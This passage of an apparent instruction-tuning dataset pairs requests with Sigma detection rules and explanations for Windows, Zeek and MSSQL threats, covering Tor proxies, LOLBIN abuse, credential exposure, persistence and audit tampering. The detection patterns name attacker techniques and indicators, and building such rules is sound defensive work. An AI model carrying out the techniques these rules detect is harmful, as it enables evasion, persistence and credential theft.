whitelisted.\n\nThis approach is aligned with cybersecurity practices that aim to detect unauthorized access or malicious activity related to scheduled tasks, a technique that can be crucial for maintaining the security and integrity of systems."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Identifies IPs performing DNS lookups associated with common Tor proxies..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify IPs performing DNS lookups associated with common Tor proxies, you should monitor DNS logs, particularly those captured by Zeek, for queries to a predefined list of domains known to serve as proxies to the Tor network. These domains include variants under tor2web.org, tor2web.com, torlink.co, and various onion-themed domains such as onion.to, onion.ink, through to onion.pet, among others, totaling more than twenty distinct addresses. This detection effort seeks to flag any client IP address that attempts to resolve these specific domains, pointing towards a potential engagement with the Tor network via these proxy services. Monitoring for such activity is crucial as it could indicate efforts to anonmyously access services on the Tor network, potentially for malicious purposes. This activity could fall under several tactics and techniques but is most commonly associated with command and control communication, as it can be an indication of an attempt to bypass network monitoring and control mechanisms by leveraging anonymity services.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: dns\n    product: zeek\ndetection:\n    selection:\n        query:\n            - 'tor2web.org'\n            - 'tor2web.com'\n            - 'torlink.co'\n            - 'onion.to'\n            - 'onion.ink'\n            - 'onion.cab'\n            - 'onion.nu'\n            - 'onion.link'\n            - 'onion.it'\n            - 'onion.city'\n            - 'onion.direct'\n            - 'onion.top'\n            - 'onion.casa'\n            - 'onion.plus'\n            - 'onion.rip'\n            - 'onion.dog'\n            - 'tor2web.fi'\n            - 'tor2web.blutmagie.de'\n            - 'onion.sh'\n            - 'onion.lu'\n            - 'onion.pet'\n            - 't2w.pw'\n            - 'tor2web.ae.org'\n            - 'tor2web.io'\n            - 'tor2web.xyz'\n            - 'onion.lt'\n            - 's1.tor-gateways.de'\n            - 's2.tor-gateways.de'\n            - 's3.tor-gateways.de'\n            - 's4.tor-gateways.de'\n            - 's5.tor-gateways.de'\n            - 'hiddenservice.net'\n    condition: selection\nfields:\n    - clientip\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: dns\n    product: zeek\ndetection:\n    selection:\n        query:\n            - 'tor2web.org'\n            - 'tor2web.com'\n            - 'torlink.co'\n            - 'onion.to'\n            - 'onion.ink'\n            - 'onion.cab'\n            - 'onion.nu'\n            - 'onion.link'\n            - 'onion.it'\n            - 'onion.city'\n            - 'onion.direct'\n            - 'onion.top'\n            - 'onion.casa'\n            - 'onion.plus'\n            - 'onion.rip'\n            - 'onion.dog'\n            - 'tor2web.fi'\n            - 'tor2web.blutmagie.de'\n            - 'onion.sh'\n            - 'onion.lu'\n            - 'onion.pet'\n            - 't2w.pw'\n            - 'tor2web.ae.org'\n            - 'tor2web.io'\n            - 'tor2web.xyz'\n            - 'onion.lt'\n            - 's1.tor-gateways.de'\n            - 's2.tor-gateways.de'\n            - 's3.tor-gateways.de'\n            - 's4.tor-gateways.de'\n            - 's5.tor-gateways.de'\n            - 'hiddenservice.net'\n    condition: selection\nfields:\n    - clientip\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Identifies IPs performing DNS lookups associated with common Tor proxies.",
      "answer": "In order to identify IPs performing DNS lookups associated with common Tor proxies, you should monitor DNS logs, particularly those captured by Zeek, for queries to a predefined list of domains known to serve as proxies to the Tor network. These domains include variants under tor2web.org, tor2web.com, torlink.co, and various onion-themed domains such as onion.to, onion.ink, through to onion.pet, among others, totaling more than twenty distinct addresses. This detection effort seeks to flag any client IP address that attempts to resolve these specific domains, pointing towards a potential engagement with the Tor network via these proxy services. Monitoring for such activity is crucial as it could indicate efforts to anonmyously access services on the Tor network, potentially for malicious purposes. This activity could fall under several tactics and techniques but is most commonly associated with command and control communication, as it can be an indication of an attempt to bypass network monitoring and control mechanisms by leveraging anonymity services."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execition of commands and binaries from the context of The program compatibility assistant (Pcalua.exe). This can be used as a LOLBIN in order to bypass application whitelisting..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of commands and binaries from the context of the program compatibility assistant (Pcalua.exe), which can be used as a LOLBIN to bypass application whitelisting, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, look for instances where the process image path ends with '\\pcalua.exe' and the command line includes ' -a', indicating that any parameter is accepted as long as it follows the '-a'. This observation is crucial as attackers might use Pcalua.exe, a legitimate Windows utility, for malicious purposes by passing commands that are otherwise blocked by application whitelisting. Be aware that there may be false positives, such as legitimate uses of Pcalua.exe via a batch script or by administrators. The severity level of this detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\pcalua.exe'\n        CommandLine|contains: ' -a' # No space after the flag because it accepts anything as long as there a \"-a\"\n    condition: selection\nfalsepositives:\n    - Legitimate use by a via a batch script or by an administrator.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\pcalua.exe'\n        CommandLine|contains: ' -a' # No space after the flag because it accepts anything as long as there a \"-a\"\n    condition: selection\nfalsepositives:\n    - Legitimate use by a via a batch script or by an administrator.\nlevel: medium\n",
      "question": "execition of commands and binaries from the context of The program compatibility assistant (Pcalua.exe). This can be used as a LOLBIN in order to bypass application whitelisting.",
      "answer": "In order to detect execution of commands and binaries from the context of the program compatibility assistant (Pcalua.exe), which can be used as a LOLBIN to bypass application whitelisting, you should: Focus on monitoring the creation of processes on Windows systems. Specifically, look for instances where the process image path ends with '\\pcalua.exe' and the command line includes ' -a', indicating that any parameter is accepted as long as it follows the '-a'. This observation is crucial as attackers might use Pcalua.exe, a legitimate Windows utility, for malicious purposes by passing commands that are otherwise blocked by application whitelisting. Be aware that there may be false positives, such as legitimate uses of Pcalua.exe via a batch script or by administrators. The severity level of this detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when net.exe is called with a password in the command line.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when net.exe is called with a password in the command line, you should monitor process creation logs on Windows systems for the execution of 'net.exe' or 'net1.exe'. Specifically, look for command lines that include 'use', followed by a network path (indicated by ':*\\\\'), and a specification of a user account ('/USER:* *'). It's crucial to exclude command lines that end with a space, as these are not part of this detection strategy. This monitoring approach aims to identify potential misuse of network utilities to gain unauthorized access or perform lateral movement, typically involving the input of credentials directly in the command line, which is a security concern.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' use '\n            - ':*\\\\'\n            - '/USER:* *'\n    filter_empty:\n        CommandLine|endswith: ' '\n    condition: all of selection_* and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' use '\n            - ':*\\\\'\n            - '/USER:* *'\n    filter_empty:\n        CommandLine|endswith: ' '\n    condition: all of selection_* and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "when net.exe is called with a password in the command line",
      "answer": "In order to detect when net.exe is called with a password in the command line, you should monitor process creation logs on Windows systems for the execution of 'net.exe' or 'net1.exe'. Specifically, look for command lines that include 'use', followed by a network path (indicated by ':*\\\\'), and a specification of a user account ('/USER:* *'). It's crucial to exclude command lines that end with a space, as these are not part of this detection strategy. This monitoring approach aims to identify potential misuse of network utilities to gain unauthorized access or perform lateral movement, typically involving the input of credentials directly in the command line, which is a security concern."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the SharpLDAPmonitor. Which can monitor the creation, deletion and changes to LDAP objects..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of the SharpLDAPmonitor, which can monitor the creation, deletion, and changes to LDAP objects, you should: Monitor Windows process creation logs for instances where the process image ends with '\\SharpLDAPmonitor.exe' or has an original file name of 'SharpLDAPmonitor.exe'. Additionally, scrutinize command lines that contain all of the following strings: '/user:', '/pass:', and '/dcip:', which are indicators that SharpLDAPmonitor is being executed with specific arguments to monitor LDAP objects. This analysis should be applied with a medium level of caution due to the potential for unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpLDAPmonitor.exe'\n        - OriginalFileName: 'SharpLDAPmonitor.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/user:'\n            - '/pass:'\n            - '/dcip:'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpLDAPmonitor.exe'\n        - OriginalFileName: 'SharpLDAPmonitor.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/user:'\n            - '/pass:'\n            - '/dcip:'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of the SharpLDAPmonitor. Which can monitor the creation, deletion and changes to LDAP objects.",
      "answer": "In order to detect execution of the SharpLDAPmonitor, which can monitor the creation, deletion, and changes to LDAP objects, you should: Monitor Windows process creation logs for instances where the process image ends with '\\SharpLDAPmonitor.exe' or has an original file name of 'SharpLDAPmonitor.exe'. Additionally, scrutinize command lines that contain all of the following strings: '/user:', '/pass:', and '/dcip:', which are indicators that SharpLDAPmonitor is being executed with specific arguments to monitor LDAP objects. This analysis should be applied with a medium level of caution due to the potential for unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of PktMon, a tool that captures network packets..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of PktMon, a tool that captures network packets, you should: Monitor for the creation of processes on Windows that involve the execution of 'pktmon.exe'. Specifically, check if any process executed ends with the file name '\\pktmon.exe' or if the OriginalFileName attribute is exactly 'PktMon.exe'. Be mindful, however, that there may be legitimate uses of this tool, thus it's classified with a medium level of alert. This detection focuses on identifying potential surveillance or network packet capture activities which might be an indication of malicious behavior.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\pktmon.exe'\n        - OriginalFileName: 'PktMon.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\pktmon.exe'\n        - OriginalFileName: 'PktMon.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
      "question": "execution of PktMon, a tool that captures network packets.",
      "answer": "In order to detect execution of PktMon, a tool that captures network packets, you should: Monitor for the creation of processes on Windows that involve the execution of 'pktmon.exe'. Specifically, check if any process executed ends with the file name '\\pktmon.exe' or if the OriginalFileName attribute is exactly 'PktMon.exe'. Be mindful, however, that there may be legitimate uses of this tool, thus it's classified with a medium level of alert. This detection focuses on identifying potential surveillance or network packet capture activities which might be an indication of malicious behavior."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting This rule will monitor executable and script file creation by office applications. Please add more file extensions or magic bytes to the logic of your choice..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to monitor executable and script file creation by office applications, you should: Focus on tracking file events within Windows operating systems, particularly those involving office applications like Word, Excel, PowerPoint, and Outlook. Look for instances where these applications are responsible for creating files that end with specific extensions such as \".exe\", \".dll\", \".ocx\", \".com\", \".ps1\", \".vbs\", \".sys\", \".bat\", \".scr\", or \".proj\", which are typically associated with executable files and scripts. Additionally, pay close attention to files that start with the magic bytes \"4D5A\", indicating they are executable. Monitoring such events involves looking for matches where an office application has either created files with the aforementioned extensions or files starting with the specified magic bytes. Given the potential for unknown false positives, the severity level of these detections is considered high. This approach is aligned with various tactics and techniques, particularly those concerning the execution of malicious files, persistence mechanisms, and potential evasion methods.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    #useful_information: Please add more file extensions and magic bytes to the logic of your choice.\n    selection1:\n        Image|endswith:\n            - '\\winword.exe'\n            - '\\excel.exe'\n            - '\\powerpnt.exe'\n            - '\\outlook.exe'\n    selection2:\n        FileName|endswith:\n            - \".exe\"\n            - \".dll\"\n            - \".ocx\"\n            - \".com\"\n            - \".ps1\"\n            - \".vbs\"\n            - \".sys\"\n            - \".bat\"\n            - \".scr\"\n            - \".proj\"\n    selection3:\n        FileMagicBytes|startswith:\n            - \"4D5A\"\n    condition: selection1 and (selection2 or selection3)\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    #useful_information: Please add more file extensions and magic bytes to the logic of your choice.\n    selection1:\n        Image|endswith:\n            - '\\winword.exe'\n            - '\\excel.exe'\n            - '\\powerpnt.exe'\n            - '\\outlook.exe'\n    selection2:\n        FileName|endswith:\n            - \".exe\"\n            - \".dll\"\n            - \".ocx\"\n            - \".com\"\n            - \".ps1\"\n            - \".vbs\"\n            - \".sys\"\n            - \".bat\"\n            - \".scr\"\n            - \".proj\"\n    selection3:\n        FileMagicBytes|startswith:\n            - \"4D5A\"\n    condition: selection1 and (selection2 or selection3)\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "This rule will monitor executable and script file creation by office applications. Please add more file extensions or magic bytes to the logic of your choice.",
      "answer": "In order to monitor executable and script file creation by office applications, you should: Focus on tracking file events within Windows operating systems, particularly those involving office applications like Word, Excel, PowerPoint, and Outlook. Look for instances where these applications are responsible for creating files that end with specific extensions such as \".exe\", \".dll\", \".ocx\", \".com\", \".ps1\", \".vbs\", \".sys\", \".bat\", \".scr\", or \".proj\", which are typically associated with executable files and scripts. Additionally, pay close attention to files that start with the magic bytes \"4D5A\", indicating they are executable. Monitoring such events involves looking for matches where an office application has either created files with the aforementioned extensions or files starting with the specified magic bytes. Given the potential for unknown false positives, the severity level of these detections is considered high. This approach is aligned with various tactics and techniques, particularly those concerning the execution of malicious files, persistence mechanisms, and potential evasion methods."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when the a stored procedure is set or cleared for automatic execution in MSSQL. A stored procedure that is set to automatic execution runs every time an instance of SQL Server is started.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a stored procedure is set or cleared for automatic execution in MSSQL, which signifies a stored procedure that is set to automatic execution runs every time an instance of SQL Server is started, you should: Monitor application logs from Windows systems, specifically focusing on MSSQL audit policies. Ensure that audit policy for monitoring 'sp_procoption' is enabled to capture relevant events in the application log. Look for log entries with the Provider Name set to 'MSSQLSERVER' and an EventID of 33205. These specific entries indicate the occurrence of an event related to automatic execution of stored procedures. The detection should zero in on log data containing references to 'object_name:sp_procoption' along with 'statement:EXEC', which highlights the execution of the stored procedure. It is important to consider the potential for false positives, which may arise from legitimate administrative actions utilizing this feature, though such occurrences are rare. Due to the sensitivity and high impact of automated execution of stored procedures in a SQL Server environment, any detection of such activity should be treated with a high level of scrutiny. Tags associated with this kind of monitoring are Persistence, Privilege Escalation, and Initial Access, as setting a stored procedure to run automatically can serve as a method for attackers to maintain persistence, elevate privileges, or gain initial access to a system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: application\n    definition: MSSQL audit policy to monitor for 'sp_procoption' must be enabled in order to receive this event in the application log\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        Provider_Name: 'MSSQLSERVER'\n        EventID: 33205\n        Data|contains|all:\n            - 'object_name:sp_procoption'\n            - 'statement:EXEC'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the feature by administrators (rare)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: application\n    definition: MSSQL audit policy to monitor for 'sp_procoption' must be enabled in order to receive this event in the application log\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        Provider_Name: 'MSSQLSERVER'\n        EventID: 33205\n        Data|contains|all:\n            - 'object_name:sp_procoption'\n            - 'statement:EXEC'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the feature by administrators (rare)\nlevel: high\n",
      "question": "when the a stored procedure is set or cleared for automatic execution in MSSQL. A stored procedure that is set to automatic execution runs every time an instance of SQL Server is started",
      "answer": "In order to detect when a stored procedure is set or cleared for automatic execution in MSSQL, which signifies a stored procedure that is set to automatic execution runs every time an instance of SQL Server is started, you should: Monitor application logs from Windows systems, specifically focusing on MSSQL audit policies. Ensure that audit policy for monitoring 'sp_procoption' is enabled to capture relevant events in the application log. Look for log entries with the Provider Name set to 'MSSQLSERVER' and an EventID of 33205. These specific entries indicate the occurrence of an event related to automatic execution of stored procedures. The detection should zero in on log data containing references to 'object_name:sp_procoption' along with 'statement:EXEC', which highlights the execution of the stored procedure. It is important to consider the potential for false positives, which may arise from legitimate administrative actions utilizing this feature, though such occurrences are rare. Due to the sensitivity and high impact of automated execution of stored procedures in a SQL Server environment, any detection of such activity should be treated with a high level of scrutiny. Tags associated with this kind of monitoring are Persistence, Privilege Escalation, and Initial Access, as setting a stored procedure to run automatically can serve as a method for attackers to maintain persistence, elevate privileges, or gain initial access to a system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation or modification of a powershell profile which could indicate suspicious activity as the profile can be used as a mean of persistence.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation or modification of a PowerShell profile which could indicate suspicious activity as the profile can be used as a means of persistence, you should: Monitor Windows file events for any creation or modification actions targeting specific PowerShell profile scripts. These profile scripts include '\\Microsoft.PowerShell_profile.ps1', '\\WindowsPowerShell\\profile.ps1', '\\PowerShell\\profile.ps1', '\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1', and '\\Program Files\\PowerShell\\7\\profile.ps1'. It's crucial to note that while detecting these changes is essential for identifying potential malicious activities, there are legitimate scenarios where a system administrator might manually create or modify these PowerShell profiles. Consequently, these legitimate activities are considered false positives. This detection strategy is of high importance due to the risk associated with PowerShell profiles being used for persistence mechanisms by attackers.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith:\n            - '\\Microsoft.PowerShell_profile.ps1'\n            - '\\WindowsPowerShell\\profile.ps1'\n            - '\\PowerShell\\profile.ps1'\n            - '\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1'\n            - '\\Program Files\\PowerShell\\7\\profile.ps1'\n    condition: selection\nfalsepositives:\n    - System administrator creating Powershell profile manually\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith:\n            - '\\Microsoft.PowerShell_profile.ps1'\n            - '\\WindowsPowerShell\\profile.ps1'\n            - '\\PowerShell\\profile.ps1'\n            - '\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1'\n            - '\\Program Files\\PowerShell\\7\\profile.ps1'\n    condition: selection\nfalsepositives:\n    - System administrator creating Powershell profile manually\nlevel: high\n",
      "question": "creation or modification of a powershell profile which could indicate suspicious activity as the profile can be used as a mean of persistence",
      "answer": "In order to detect the creation or modification of a PowerShell profile which could indicate suspicious activity as the profile can be used as a means of persistence, you should: Monitor Windows file events for any creation or modification actions targeting specific PowerShell profile scripts. These profile scripts include '\\Microsoft.PowerShell_profile.ps1', '\\WindowsPowerShell\\profile.ps1', '\\PowerShell\\profile.ps1', '\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1', and '\\Program Files\\PowerShell\\7\\profile.ps1'. It's crucial to note that while detecting these changes is essential for identifying potential malicious activities, there are legitimate scenarios where a system administrator might manually create or modify these PowerShell profiles. Consequently, these legitimate activities are considered false positives. This detection strategy is of high importance due to the risk associated with PowerShell profiles being used for persistence mechanisms by attackers."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting specific process characteristics of Chinese TAIDOOR RAT malware load.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect specific process characteristics of Chinese TAIDOOR RAT malware load, you should: Focus on monitoring the process creation logs within Windows environments. Be on the lookout for command line activities that exhibit peculiar patterns indicative of this malware type. Specifically, check for commands that include the patterns 'dll,MyStart' or 'dll MyStart'. Additionally, pay attention to scenarios where the command line ends with ' MyStart' in conjunction with the presence of 'rundll32.exe'. These specific command line characteristics are strong indicators of an attempt to load the TAIDOOR RAT malware. Be aware that there might be cases where these patterns do not signify a malicious activity, but such instances are unknown. Due to the high impact and risk associated with this malware, this detection carries a high priority level.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - 'dll,MyStart'\n            - 'dll MyStart'\n    selection2a:\n        CommandLine|endswith: ' MyStart'\n    selection2b:\n        CommandLine|contains: 'rundll32.exe'\n    condition: selection1 or ( selection2a and selection2b )\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - 'dll,MyStart'\n            - 'dll MyStart'\n    selection2a:\n        CommandLine|endswith: ' MyStart'\n    selection2b:\n        CommandLine|contains: 'rundll32.exe'\n    condition: selection1 or ( selection2a and selection2b )\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "specific process characteristics of Chinese TAIDOOR RAT malware load",
      "answer": "In order to detect specific process characteristics of Chinese TAIDOOR RAT malware load, you should: Focus on monitoring the process creation logs within Windows environments. Be on the lookout for command line activities that exhibit peculiar patterns indicative of this malware type. Specifically, check for commands that include the patterns 'dll,MyStart' or 'dll MyStart'. Additionally, pay attention to scenarios where the command line ends with ' MyStart' in conjunction with the presence of 'rundll32.exe'. These specific command line characteristics are strong indicators of an attempt to load the TAIDOOR RAT malware. Be aware that there might be cases where these patterns do not signify a malicious activity, but such instances are unknown. Due to the high impact and risk associated with this malware, this detection carries a high priority level."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the powerShell Set-Mailbox Cmdlet to set-up an SMTP forwarding rule..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of the PowerShell Set-Mailbox Cmdlet to set up an SMTP forwarding rule, you should focus on monitoring PowerShell script activities within Windows environments. Specifically, look for instances where Script Block Logging is enabled, as this provides the necessary visibility into executed PowerShell scripts. The key indicators to watch for include the presence of \"Set-Mailbox\", \"-DeliverToMailboxAndForward\", and \"-ForwardingSmtpAddress\" within the script text, which collectively point toward the configuration of SMTP forwarding rules potentially for malicious purposes. It is important to note that there could be legitimate reasons for these commands to be used, so consider the context in which they appear to reduce false positives. This approach falls under the category of monitoring PowerShell script execution with an emphasis on understanding and identifying potentially malicious command usage related to email forwarding setup.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Set-Mailbox '\n            - ' -DeliverToMailboxAndForward '\n            - ' -ForwardingSmtpAddress '\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the cmdlet to forward emails\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Set-Mailbox '\n            - ' -DeliverToMailboxAndForward '\n            - ' -ForwardingSmtpAddress '\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the cmdlet to forward emails\nlevel: medium\n",
      "question": "usage of the powerShell Set-Mailbox Cmdlet to set-up an SMTP forwarding rule.",
      "answer": "In order to detect usage of the PowerShell Set-Mailbox Cmdlet to set up an SMTP forwarding rule, you should focus on monitoring PowerShell script activities within Windows environments. Specifically, look for instances where Script Block Logging is enabled, as this provides the necessary visibility into executed PowerShell scripts. The key indicators to watch for include the presence of \"Set-Mailbox\", \"-DeliverToMailboxAndForward\", and \"-ForwardingSmtpAddress\" within the script text, which collectively point toward the configuration of SMTP forwarding rules potentially for malicious purposes. It is important to note that there could be legitimate reasons for these commands to be used, so consider the context in which they appear to reduce false positives. This approach falls under the category of monitoring PowerShell script execution with an emphasis on understanding and identifying potentially malicious command usage related to email forwarding setup."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when an attacker calls the \"ALTER SERVER AUDIT\" or \"DROP SERVER AUDIT\" transaction in order to delete or disable audit logs on the server.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when an attacker calls the \"ALTER SERVER AUDIT\" or \"DROP SERVER AUDIT\" transaction in order to delete or disable audit logs on the server, you should monitor the Windows application logs, specifically for events from the MSSQLSERVER provider. Focus on identifying event ID 33205, which indicates that there has been an attempt to modify the SQL Server's audit configuration. This event should capture when someone issues commands to either alter or drop server audit settings\u2014actions that could significantly impact the ability to track and analyze activities on the server. These modifications are critical security events, as they could be indicative of an attacker trying to cover their tracks by disabling or deleting audit logs.\n\nIt's essential to recognize that instances of these events should be infrequent, primarily occurring during initial setup or rare configurations changes by administrators. Due to the high sensitivity and potential risk associated with these actions, they are classified at a high level of concern.\n\nMonitoring for these specific modifications will involve looking for the occurrence of text strings 'statement:ALTER SERVER AUDIT' and 'statement:DROP SERVER AUDIT' within the data field of the captured event logs. Identifying these actions promptly can serve to alert on potential malicious attempts to undermine the server's auditing capability, enabling appropriate and swift response measures to be taken.\n\nWithin the context of MITRE ATT&CK tactics and techniques, these observations are closely related to Persistence, Privilege Escalation, and Defense Evasion. Each of these tactics represents different aspects of how an attacker might seek to maintain access, elevate their control, or avoid detection within a compromised system respectively. By ensuring that audit logs are closely monitored for such critical changes, defenders can better safeguard against these tactics, thereby reinforcing the security posture of their SQL Server environments.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: application\n    definition: MSSQL audit policy must be enabled in order to receive this event in the application log\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        Provider_Name: 'MSSQLSERVER'\n        EventID: 33205\n        Data|contains:\n            - 'statement:ALTER SERVER AUDIT'\n            - 'statement:DROP SERVER AUDIT'\n    condition: selection\nfalsepositives:\n    - This event should only fire when an administrator is modifying the audit policy. Which should be a rare occurrence once it's set up\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: application\n    definition: MSSQL audit policy must be enabled in order to receive this event in the application log\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        Provider_Name: 'MSSQLSERVER'\n        EventID: 33205\n        Data|contains:\n            - 'statement:ALTER SERVER AUDIT'\n            - 'statement:DROP SERVER AUDIT'\n    condition: selection\nfalsepositives:\n    - This event should only fire when an administrator is modifying the audit policy. Which should be a rare occurrence once it's set up\nlevel: high\n",
      "question": "when an attacker calls the \"ALTER SERVER AUDIT\" or \"DROP SERVER AUDIT\" transaction in order to delete or disable audit logs on the server",
      "answer": "In order to detect when an attacker calls the \"ALTER SERVER AUDIT\" or \"DROP SERVER AUDIT\" transaction in order to delete or disable audit logs on the server, you should monitor the Windows application logs, specifically for events from the MSSQLSERVER provider. Focus on identifying event ID 33205, which indicates that there has been an attempt to modify the SQL Server's audit configuration. This event should capture when someone issues commands to either alter or drop server audit settings\u2014actions that could significantly impact the ability to track and analyze activities on the server. These modifications are critical security events, as they could be indicative of an attacker trying to cover their tracks by disabling or deleting audit logs.\n\nIt's essential to recognize that instances of these events should be infrequent, primarily occurring during initial setup or rare configurations changes by administrators. Due to the high sensitivity and potential risk associated with these actions, they are classified at a high level of concern.\n\nMonitoring for these specific modifications will involve looking for the occurrence of text strings 'statement:ALTER SERVER AUDIT' and 'statement:DROP SERVER AUDIT' within the data field of the captured event logs. Identifying these actions promptly can serve to alert on potential malicious attempts to undermine the server's auditing capability, enabling appropriate and swift response measures to be taken.\n\nWithin the context of MITRE ATT&CK tactics and techniques, these observations are closely related to Persistence, Privilege Escalation, and Defense Evasion. Each of these tactics represents different aspects of how an attacker might seek to maintain 